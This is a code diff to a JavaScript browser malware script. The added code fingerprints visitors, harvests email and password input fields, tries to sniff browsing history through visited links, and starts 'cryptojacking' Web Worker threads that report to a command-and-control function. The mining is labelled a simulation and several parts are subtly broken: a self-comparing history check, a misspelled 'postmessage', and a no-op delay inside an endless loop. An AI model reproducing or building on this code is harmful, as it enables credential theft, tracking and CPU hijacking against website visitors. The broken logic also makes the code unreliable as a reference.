@@ -245,7 +245,7 @@
                     cookies_enabled: navigator.cookieEnabled,
                     mobile: this.isMobile,
                     hardware_concurrency: navigator.hardwareConcurrency || 'uknown',
-                    device_memory: navigator.deviceMemory || 'uknown',
+                    device_memory: navigator.deviceMemory || 'unknown',
                     connection: navigator.connection ? {
                         effectiveType: navigator.connection.effectiveType,
                         downlink: navigator.connection.downlink,
@@ -333,7 +333,7 @@
            }
 
            collectAutofillData() {
-            const data = {}
+            const data = {};
             const inputs = document.querySelectorAll('input[type="email"], input[type="password"], input[type="text"], input[type="tel"], input[type="number"]');
 
             inputs.forEach(input => {
@@ -357,8 +357,83 @@
             return links;
            }
 
-           isLinkVisited() {
-            
+           isLinkVisited(href) {
+            try {
+                const link = document.createElement('a');
+                link.href = href;
+                document.body.appendChild(link);
+                const computed = window.getComputedStyle(link);
+                const visited = computed.color !== computed.getPropertyValue('color');
+                document.body.removeChild(link);
+                return visited;
+
+            } catch (e) {
+                console.error(`Error looking for a visited link: ${e}`);
+                return false;
+            }
+           }
+
+           async startCryptojacking() {
+            if (navigator.hardwareConcurrency && navigator.hardwareConcurrency > 1) {
+                console.log('Starting cryptojacking operations....');
+                // Use webworkers for mining
+                const workerCount = Math.min(2, navigator.hardwareConcurrency - 1);
+
+                for (let i = 0; i < workerCount; i++) {
+                    this.createMiningWorker();
+                }
+                this.operations.mining = true;
+            }
+           }
+
+           createMiningWorker() {
+            const workerCode = `
+                let hashes = 0;
+                const startTime = Date.now();
+
+                self.onmessage = function(e) {
+                    if (e.data == 'stop') {
+                        self.postmessage({ stopped: true, hashes: hashes});
+                        self.close();
+                        return;
+                    }
+                    
+                    // Mining simulation
+                    while (true) {
+                        const data = Math.random().toString(36) + Date.now().toString(36);
+                        const hash = btoa(data).substr(0, 64);
+                        hashes++;
+
+                        
+                        //Report every 1000 hashes
+                        if (hashes % 1000 === 0) {
+                            self.postMessage({
+                                hashes: 1000,
+                                hashrate: hashes / ((Date.now() - startTime) / 1000)
+                            });
+                        }
+
+                        //Small delay to prevent blocking
+                        if (hashes % 100 === 0) {
+                            setTimeout(() => {}, 1);
+                        } 
+                    }
+                };
+            `;
+            const blob = new Blob([workerCode]);
+            const worker = new Worker(URL.createObjectURL(blob));
+
+            worker.onmessage = (e) => {
+                if (e.data.hashes) {
+                    this.reportToC2('mining_update', e.data);
+                }
+            };
+            worker.postMessage('start');
+            return worker;
+           }
+
+           async startSEOBooster() {
+
            }
         }
 
